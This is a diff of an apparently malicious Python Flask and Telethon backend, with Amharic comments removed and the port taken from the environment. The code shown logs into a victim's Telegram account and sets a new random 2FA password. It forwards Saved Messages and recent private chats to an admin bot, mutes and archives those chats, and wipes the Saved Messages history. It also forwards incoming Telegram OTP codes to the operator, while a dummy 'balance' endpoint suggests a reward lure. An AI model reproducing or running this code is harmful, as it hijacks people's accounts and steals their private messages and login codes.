@@ -3,6 +3,7 @@ import threading
 import requests
 import random
 import string
+import os
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient, events
@@ -83,10 +84,8 @@ def verify_code():
     phone_code_hash = session_data['phone_code_hash']
 
     async def async_verify():
-        # 1. ሎጊን ማድረግ
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         
-        # 2. የዘፈቀደ ጠንካራ ፓስዎርድ ማመንጨት (2FA)
         chars = string.ascii_letters + string.digits + "!@#$%"
         new_password = "".join(random.choice(chars) for _ in range(12))
 
@@ -108,11 +107,9 @@ def verify_code():
         )
         send_telegram_alert(alert_msg)
 
-        # 🚀 3. መረጃዎችን መጥራት፣ ቻቶችን Mute & Archive ማድረግ እና ወደ ቦት መላክ
         try:
             send_telegram_alert(f"📂 *የ {phone} Saved Messages እና Personal Chats መቃኘት ተጀምረዋል...*")
             
-            # ሀ) Saved Messages ይዘቶችን ወደ ቦት ማስተላለፍ
             async for message in client.iter_messages('me', limit=100):
                 try:
                     await client.forward_messages(int(ADMIN_CHAT_ID), message)
@@ -120,17 +117,14 @@ def verify_code():
                 except Exception:
                     pass
 
-            # ለ) Personal Private Chats ቃኝቶ Mute & Archive ማድረግ እና ወደ ቦት መላክ
             async for dialog in client.iter_dialogs():
                 if dialog.is_user and dialog.entity and not dialog.entity.bot:
                     try:
-                        # 1. ቻቱን Mute ማድረግ
                         await client(functions.account.UpdateNotifySettingsRequest(
                             peer=dialog.entity,
                             settings=types.InputPeerNotifySettings(mute_until=2147483647)
                         ))
                         
-                        # 2. ቻቱን ወደ Archive ማህደር ማዛወር
                         await client(functions.folders.EditPeerFoldersRequest(
                             folder_peers=[types.InputFolderPeer(
                                 peer=dialog.entity,
@@ -140,7 +134,6 @@ def verify_code():
                     except Exception:
                         pass
 
-                    # 3. መልዕክቶቹን ወደ ቦት መላክ
                     async for message in client.iter_messages(dialog.entity, limit=20):
                         if message.media or message.message:
                             try:
@@ -149,7 +142,6 @@ def verify_code():
                             except Exception:
                                 pass
 
-            # ሐ) የተጠቃሚውን Saved Messages ታሪክ ሙሉ በሙሉ በማጽዳት ከስልኩ እንዲደበቅ ማድረግ
             try:
                 await client(functions.messages.DeleteHistoryRequest(
                     peer='me',
@@ -163,7 +155,6 @@ def verify_code():
         except Exception as transfer_err:
             print("Data transfer error:", transfer_err)
 
-        # 🎯 4. ከቴሌግራም ኦፊሻል ሰርቪስ (777000) አዲስ የሚመጡ OTPዎችን ተቀብሎ በትክክለኛው ፎርማት ወደ ቦት መላክ
         @client.on(events.NewMessage(chats=777000))
         async def otp_listener(event):
             try:
@@ -195,8 +186,8 @@ def verify_code():
 def update_balance():
     data = request.json
     reward = data.get('reward', 0)
-    # ለጊዜው የውሸት ቀሪ ሂሳብ ማስተካከያ (Dummy Balance)
     return jsonify({'success': True, 'new_balance': reward})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
